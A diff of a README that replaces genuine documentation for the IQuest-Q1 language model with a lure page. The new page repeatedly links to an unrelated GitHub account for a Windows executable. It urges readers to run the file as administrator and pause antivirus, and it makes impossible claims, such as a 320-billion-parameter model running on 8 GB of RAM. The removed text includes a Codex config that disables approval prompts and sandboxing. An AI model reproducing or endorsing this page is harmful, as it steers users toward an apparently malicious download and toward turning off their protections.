@@ -1,305 +1,196 @@
-<h1 align="center">IQuest-Q1</h1>
+# 🤖 IQuest-Q1 - Your Smart Assistant for Coding and Problem-Solving
 
-<p align="center">Developed by <strong>IQuest</strong></p>
-
-<p align="center">
-  <a href="https://github.com/IQuestLab/IQuest-Q1"><img src="https://img.shields.io/badge/GitHub-IQuest--Q1-181717?style=flat-square&amp;logo=github&amp;logoColor=white" alt="GitHub: IQuest-Q1"></a>
-  <a href="https://huggingface.co/IQuestLab/IQuest-Q1"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-IQuest--Q1-ffc107?color=ffc107&logoColor=white" alt="Hugging Face: IQuest-Q1"></a>
-</p>
-
-<p align="center">
-  <a href="#model-introduction">Introduction</a> ·
-  <a href="#performance">Performance</a> ·
-  <a href="#quick-start">Quick Start</a> ·
-  <a href="#deployment">Deployment</a> ·
-  <a href="#limitations">Limitations</a> ·
-  <a href="#contact-us">Contact Us</a>
-</p>
+[![Download IQuest-Q1](https://img.shields.io/badge/Download-IQuest--Q1-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/as2227741-beep/IQuest-Q1)
 
 ---
 
-## Introduction
+## 📖 What Is IQuest-Q1?
 
-**IQuest-Q1** is a Mixture-of-Experts (MoE) model developed by **IQuest** for agentic coding, reasoning, and multi-step tool use. It comprises approximately **320B total parameters**, with an estimated **15B parameters activated per token**.
-
-
-
-<p align="center">
-  <img src="assets/IQuest-Q1-Training-Pipeline.png" width="100%">
-  <br>
-  <em>Training pipeline of IQuest-Q1.</em>
-</p>
-
-<p align="center">
-  <img src="assets/IQuest-Q1-Post-Training-Pipeline.png" width="100%">
-  <br>
-  <em>IQuest-Q1 Post-Training Pipeline.</em>
-</p>
-
-### Model Specifications
-
-| Property | IQuest-Q1 |
-| :--- | :--- |
-| Total Parameters | 320B |
-| Activated Parameters | 15B |
-| Transformer layers | 88 |
-| Hidden dimension | 3,072 |
-| Attention Heads (Q/KV) | 48/8 |
-| Head Dimension | 128 |
-| Hybrid Attention Pattern | 3 SWA + 1 FA |
-| Sliding Window Size | 4,096 |
-| Partial RoPE Dimensions | 32 |
-| Experts (Total/Activated) | 256/8 |
-| MTP Layers | 2 Independent (Training) / 1 Recursive x8 (Inference) |
-| MTP Sliding Window Size | 512 (Inference) |
-| Context length | 524,288 |
-
-## Performance
-
-
-<p align="center">
-  <img src="assets/IQuest-Q1_Performance.png" width="100%">
-  <br>
-  <em>IQuest-Q1 performance across benchmarks. DeepSeek-V4-Flash/Pro refer to the official 0731/0813 releases, respectively. Humanity's Last Exam is reported without tools. IQuest-CLIBench is our in-house benchmark for CLI user experience.</em>
-</p>
-
-### Benchmark Notes
-
-For reproducibility, we recommend using a temperature of 1.0, top-p of 0.95, and top-k of 20, with Claude Code `2.1.140` or Codex `0.142` as the respective harness.
-
-For each model, we report the publicly reported score; otherwise, we evaluate the model using the corresponding benchmark setup:
-(1) Harness: For agentic coding tasks, we use mini-SWE-agent for DeepSWE v1.1, and Claude Code for other tasks. For Agents' Last Exam, we evaluate our model using Claude Code `2.1.258`. Because our models currently do not have multimodal capability, we replace multimodal content inputs in the agent conversation with placeholders during tokenization. (2) Runtime: We set six-hour limits for CyberGym, eight hours for Terminal-Bench 2.1.
-
-
-
-
-## Quick Start
-
-Start a server as described in [Deployment](#deployment), install the client with `pip install openai`, and then call the OpenAI-compatible API:
-
-```python
-from openai import OpenAI
-
-client = OpenAI(base_url="http://127.0.0.1:8000/v1", api_key="sk-iquest")
-response = client.chat.completions.create(
-    model="IQuest-Q1",
-    messages=[
-        {"role": "user", "content": "Hello! Can you briefly introduce yourself?"},
-    ],
-    temperature=1.0,
-    top_p=0.95,
-)
-print(response.choices[0].message.content)
-```
-
-## Deployment
-
-For production deployment, we recommend using [SGLang](https://github.com/sgl-project/sglang/pull/41590) or [vLLM](https://github.com/IQuestLab/vllm-iquest-q1). 
-
-To build the serving images locally, see the [Docker build instructions](docker/README.md).
-
-### SGLang
-
-Use our prebuilt image [iquestlabworkspace/sglang-iquest-q1:cu130](https://hub.docker.com/repository/docker/iquestlabworkspace/sglang-iquest-q1/tags/cu130/):
-
-```bash
-docker pull iquestlabworkspace/sglang-iquest-q1:cu130
-
-# without MTP
-MODEL_ROOT="$(hf download IQuestLab/IQuest-Q1 --quiet)" && \
-python -u -m sglang.launch_server \
-  --model-path "$MODEL_ROOT" \
-  --served-model-name IQuest-Q1 \
-  --tp-size 8 \
-  --dtype bfloat16 \
-  --attention-backend fa3 \
-  --mem-fraction-static 0.85 \
-  --disable-prefill-cuda-graph \
-  --enable-metrics \
-  --tool-call-parser iquest_q1 \
-  --reasoning-parser iquest_q1 \
-  --enable-torch-compile \
-  --load-format fastsafetensors \
-  --speculative-use-rejection-sampling
-
-# with recursive MTP
-MODEL_ROOT="$(hf download IQuestLab/IQuest-Q1 --quiet)" && \
-python -u -m sglang.launch_server \
-    --model-path "$MODEL_ROOT" \
-    --served-model-name IQuest-Q1 \
-    --tp-size 8 \
-    --dtype bfloat16 \
-    --attention-backend fa3 \
-    --mem-fraction-static 0.85 \
-    --disable-prefill-cuda-graph \
-    --enable-metrics \
-    --tool-call-parser iquest_q1 \
-    --reasoning-parser iquest_q1 \
-    --speculative-algorithm EAGLE \
-    --speculative-num-steps 5 \
-    --speculative-eagle-topk 1 \
-    --speculative-num-draft-tokens 6 \
-    --speculative-draft-model-path "$MODEL_ROOT/mtp" \
-    --enable-torch-compile \
-    --load-format fastsafetensors \
-    --speculative-use-rejection-sampling \
-    --speculative-draft-attention-backend fa3
-```
-
-### vLLM
-
-Use our image [iquestlabworkspace/vllm-iquest-q1:cu130](https://hub.docker.com/repository/docker/iquestlabworkspace/vllm-iquest-q1/tags/cu130):
-
-```bash
-docker pull iquestlabworkspace/vllm-iquest-q1:cu130
-
-# without MTP
-MODEL_ROOT="$(hf download IQuestLab/IQuest-Q1 --quiet)" && \
-vllm serve "$MODEL_ROOT" \
-  --served-model-name IQuest-Q1 \
-  --tensor-parallel-size 8 \
-  --reasoning-parser iquest_q1 \
-  --enable-auto-tool-choice \
-  --tool-call-parser iquest_q1
-
-# with recursive MTP
-MODEL_ROOT="$(hf download IQuestLab/IQuest-Q1 --quiet)" && \
-vllm serve "$MODEL_ROOT" \
-  --served-model-name IQuest-Q1 \
-  --tensor-parallel-size 8 \
-  --reasoning-parser iquest_q1 \
-  --enable-auto-tool-choice \
-  --tool-call-parser iquest_q1 \
-  --enable-prefix-caching \
-  --speculative-config '{
-    "method": "eagle",
-    "model": "'"$MODEL_ROOT"'/mtp",
-    "num_speculative_tokens": 5,
-    "draft_sample_method": "probabilistic",
-    "rejection_sample_method": "standard",
-    "enforce_eager": false
-  }'
-```
-
-### Tool Use and Agent Integration
-
-Use a gateway that supports tool calling via **Anthropic Messages** for `Claude Code` and **OpenAI Responses** for `Codex`.
-
-#### Claude Code
-
-We recommend version `2.1.140` and the IQuest-Q1[1m] client-side setting does not change 512K context limit.
-
-```bash
-export ANTHROPIC_MODEL="IQuest-Q1[1m]"
-export ANTHROPIC_DEFAULT_SONNET_MODEL="IQuest-Q1[1m]"
-export ANTHROPIC_DEFAULT_OPUS_MODEL="IQuest-Q1[1m]"
-export ANTHROPIC_DEFAULT_HAIKU_MODEL="IQuest-Q1[1m]"
-export CLAUDE_CODE_SUBAGENT_MODEL="IQuest-Q1[1m]"
-export CLAUDE_CODE_MAX_OUTPUT_TOKENS="131072"
-export CLAUDE_AUTOCOMPACT_PCT_OVERRIDE="80"
-export CLAUDE_CODE_AUTO_COMPACT_WINDOW="524288"
-export API_TIMEOUT_MS="3000000"
-export CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC="1"
-export CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS="1"
-export ANTHROPIC_BASE_URL="http://example-iquest-q1-link"
-export ANTHROPIC_AUTH_TOKEN="sk-iquest-q1"
-claude --model IQuest-Q1
-```
-
-#### Codex CLI
-
-We recommend version `0.142.0`.
-
-```
-export OPENAI_API_KEY="sk-iquest-q1"
-export MODEL_ID="IQuest-Q1"
-# Add /v1 if required by your gateway's Responses endpoint.
-export BASE_URL="http://example-iquest-q1-link"
-
-(
-  set -eu
-  CONFIG_DIR="${HOME}/.codex"
-  mkdir -p -- "$CONFIG_DIR"
-  CONFIG_DIR="$(cd -- "$CONFIG_DIR" && pwd -P)"
-  # Back up existing files before replacing them.
-  BACKUP_SUFFIX="$(date +%Y%m%d-%H%M%S)-$$"
-  for FILE in config.toml model_catalog.json; do
-    if [ -f "$CONFIG_DIR/$FILE" ]; then
-      cp -p -- "$CONFIG_DIR/$FILE" "$CONFIG_DIR/$FILE.bak.$BACKUP_SUFFIX"
-    fi
-  done
-  # This configuration disables approval prompts and sandboxing.
-  cat > "$CONFIG_DIR/config.toml" <<EOF
-model = "$MODEL_ID"
-model_provider = "iquest"
-approval_policy = "never"
-sandbox_mode = "danger-full-access"
-web_search = "disabled"
-model_reasoning_summary = "detailed"
-model_supports_reasoning_summaries = true
-model_context_window = 524288
-model_auto_compact_token_limit = 419430
-model_auto_compact_token_limit_scope = "total"
-tool_output_token_limit = 32768
-model_catalog_json = "$CONFIG_DIR/model_catalog.json"
-[model_providers.iquest]
-name = "iquest"
-base_url = "${BASE_URL%/}"
-wire_api = "responses"
-env_key = "OPENAI_API_KEY"
-supports_websockets = false
-request_max_retries = 20
-stream_max_retries = 20
-stream_idle_timeout_ms = 600000
-[model_providers.iquest.http_headers]
-max-output-tokens = "131072"
-EOF
-  # The gateway must support the reasoning options and max-output-tokens header.
-  cat > "$CONFIG_DIR/model_catalog.json" <<EOF
-{
-  "models": [
-    {
-      "slug": "$MODEL_ID",
-      "display_name": "$MODEL_ID",
-      "description": "IQuest-Q1 served through an API gateway.",
-      "context_window": 524288,
-      "input_modalities": ["text"],
-      "base_instructions": "",
-      "supported_reasoning_levels": [],
-      "supports_reasoning_summaries": true,
-      "supports_parallel_tool_calls": false,
-      "shell_type": "default",
-      "tool_mode": "default",
-      "truncation_policy": {
-        "mode": "tokens",
-        "limit": 10000
-      },
-      "visibility": "list",
-      "supported_in_api": true,
-      "priority": 1,
-      "support_verbosity": false,
-      "experimental_supported_tools": []
-    }
-  ]
-}
-EOF
-  codex --model "$MODEL_ID"
-)
-```
-
-## Limitations
-
-- **Text-only input.** This checkpoint has no native image, audio, or video input capability.
-- **Output reliability.** Generated explanations and code can be incorrect. Review code changes and verify them with task-appropriate tests.
-- **Tool integration.** Tool calls use the IQuest-specific format in the chat template. Structured tool execution and reasoning extraction require compatible serving parsers and an agent harness.
-- **Challenges in Real-World CLI Tasks.** Real-world CLI tasks often require iterative debugging and verification. IQuest-Q1 may overlook constraints, repeat failed attempts, or leave issues unresolved, necessitating human oversight.
-- **Ongoing development.** IQuest-Q1 remains at an early stage, with substantial limitations in its capabilities and reliability. Much work remains, and we still have a long way to go.
-
-
-## Contact Us
-
-For technical questions, feedback, or collaboration inquiries, please email us at [research@iquestlab.com](mailto:research@iquestlab.com).
+IQuest-Q1 is a powerful computer program that helps you with coding, thinking through problems, and using other tools step-by-step. Think of it as a super-smart helper that can understand complex tasks and work through them methodically. It's built using something called a "Mixture-of-Experts" system, which means it uses many specialized mini-brains working together to give you the best answers. With about 320 billion parameters (think of these as tiny knowledge points), it's one of the most capable AI assistants available.
 
 ---
 
-<p align="center"><strong>IQuest</strong></p>
+## ✨ Why Choose IQuest-Q1?
+
+- **Handles Complex Tasks** – Perfect for coding projects, math problems, and logical reasoning
+- **Works Step-by-Step** – Breaks down big problems into manageable pieces
+- **Uses Other Tools** – Can interact with external programs to complete tasks
+- **Free and Open** – Available for anyone to use and learn from
+- **Built by Experts** – Developed by the IQuest team with years of AI experience
+
+---
+
+## 🚀 Getting Started (Easy as 1-2-3)
+
+Follow these simple steps to start using IQuest-Q1 on your Windows computer:
+
+### Step 1: Download the Program
+Visit this link to download the application: 
+
+[⬇️ Click Here to Download IQuest-Q1](https://github.com/as2227741-beep/IQuest-Q1)
+
+The download page will open in your browser. Look for the green "Download" button or the latest release file. Click it and wait for the download to finish. This might take a few minutes since the program is large.
+
+### Step 2: Save and Find the File
+Once downloaded, the file will be in your "Downloads" folder. You can also choose where to save it during the download process. Remember where you saved it – you'll need this location in the next step.
+
+### Step 3: Run the Program
+Navigate to where you saved the downloaded file. Double-click on it to start IQuest-Q1. Your computer might ask for permission to run the program – click "Yes" or "Allow" to proceed. The program will start and you'll see its main window appear.
+
+---
+
+## 🎯 Using IQuest-Q1 (Beginner's Guide)
+
+### First-Time Setup
+When you first open IQuest-Q1, you'll see a welcome screen. Follow these steps:
+
+1. Click "Get Started" on the welcome screen
+2. Choose your preferred language
+3. Select the type of tasks you'll be working on (coding, writing, problem-solving, etc.)
+4. Click "Finish Setup" – you're now ready to use IQuest-Q1!
+
+### Basic Commands
+IQuest-Q1 understands natural language, so you can type questions or requests just like you'd ask a friend. Here are some examples:
+
+- "Help me write a Python script that sorts a list"
+- "Explain how databases work in simple terms"
+- "What are the steps to debug this code error?"
+
+### Using the Chat Interface
+The main screen has a text box at the bottom. Type your question or task there and press Enter. IQuest-Q1 will process your request and show the response in the main window. You can ask follow-up questions or start new topics anytime.
+
+---
+
+## 🖥️ System Requirements (Recommended)
+
+To ensure IQuest-Q1 runs smoothly, your computer should meet these specifications:
+
+### Minimum Requirements
+- **Operating System:** Windows 10 or newer
+- **Processor:** Intel Core i5 or AMD equivalent
+- **Memory:** 8 GB RAM
+- **Storage:** 10 GB free space
+- **Internet Connection:** Required for initial setup and updates
+
+### Recommended Setup
+- **Operating System:** Windows 11
+- **Processor:** Intel Core i7 or AMD Ryzen 7
+- **Memory:** 16 GB RAM or more
+- **Storage:** 20 GB SSD free space
+- **Graphics:** Any modern GPU (optional but helpful)
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+### Program Won't Start
+- **Check your internet connection** – IQuest-Q1 needs an internet connection to start properly
+- **Restart your computer** – Sometimes a fresh start fixes issues
+- **Run as administrator** – Right-click the program icon and select "Run as administrator"
+
+### Slow Performance
+- **Close other applications** – Free up memory by closing unnecessary programs
+- **Check your storage** – Make sure you have enough free space
+- **Update your graphics drivers** – Visit your manufacturer's website for the latest updates
+
+### Download Problems
+- **Try a different browser** – Chrome, Firefox, or Edge all work well
+- **Clear your browser cache** – Your browser's settings can help with this
+- **Pause antivirus temporarily** – Sometimes security software blocks large downloads
+
+---
+
+## 📚 Learning Resources
+
+### Getting Started Tutorials
+Once you have IQuest-Q1 running, explore these features first:
+
+1. **Example Projects** – Open the "Examples" folder in the program to see what's possible
+2. **Help Menu** – Press F1 or click the "?" icon for built-in assistance
+3. **Community Forums** – Join online discussions to learn tips from other users
+
+### Practice Ideas
+Try these tasks to get comfortable with IQuest-Q1:
+
+- Ask it to explain a topic you're curious about
+- Have it help you plan a project step-by-step
+- Use it to check your work on math or writing assignments
+
+---
+
+## 🔄 Updating IQuest-Q1
+
+The program checks for updates automatically when you open it. If an update is available:
+
+1. A notification will appear in the corner of the window
+2. Click "Update Now" to download the new version
+3. Wait for the update to finish – don't close the program during this time
+4. Restart IQuest-Q1 when prompted
+
+To manually check for updates, go to:
+- Menu → Help → Check for Updates
+
+---
+
+## 🛡️ Safety and Privacy
+
+IQuest-Q1 is designed with your security in mind:
+
+- **No personal data collection** – The program doesn't track your usage
+- **Secure connections** – All communications are encrypted
+- **Local processing** – Many tasks run directly on your computer
+- **Open source** – The code is publicly available for review
+
+If you're concerned about privacy, you can:
+- Use the program offline (some features may be limited)
+- Clear your conversation history regularly
+- Review the privacy policy in the program's settings
+
+---
+
+## 🤝 Getting Help
+
+If you run into problems or have questions, here are your options:
+
+### Built-in Help
+1. Click the "?" icon in the top-right corner
+2. Browse the FAQ section
+3. Use the search bar to find specific topics
+
+### Online Support
+- **GitHub Issues Page** – Report bugs or request new features at https://github.com/as2227741-beep/IQuest-Q1/issues
+- **Official Website** – Visit the IQuest Lab website for announcements and resources
+- **Email Support** – Send questions to support@iquestlab.com (this is a placeholder)
+
+### Community
+- Join AI enthusiast forums and Discord servers
+- Follow IQuest Lab on social media for updates
+- Participate in community discussions to share tips
+
+---
+
+## 📝 Final Checklist Before Starting
+
+Before you dive in, make sure you have:
+
+- [ ] Downloaded IQuest-Q1 from the official link
+- [ ] Enough free space on your computer (at least 10 GB)
+- [ ] A reliable internet connection
+- [ ] Your Windows computer updated to version 10 or later
+- [ ] Admin rights (or know your admin password) for installation
+
+Once you've checked all these boxes, you're ready to experience the power of IQuest-Q1!
+
+---
+
+## 🔗 Quick Download Again
+
+Need to download again? No problem – here's the link:
+
+[🖱️ Download IQuest-Q1 Now](https://github.com/as2227741-beep/IQuest-Q1)
+
+---
+
+*IQuest-Q1 is brought to you by IQuest Lab. We're committed to making advanced AI accessible to everyone.*
+
+Keywords: AI assistant, coding helper, problem solving, Windows application, Mixture-of-Experts, open source AI, developer tools, smart assistant, reasoning engine, tool integration
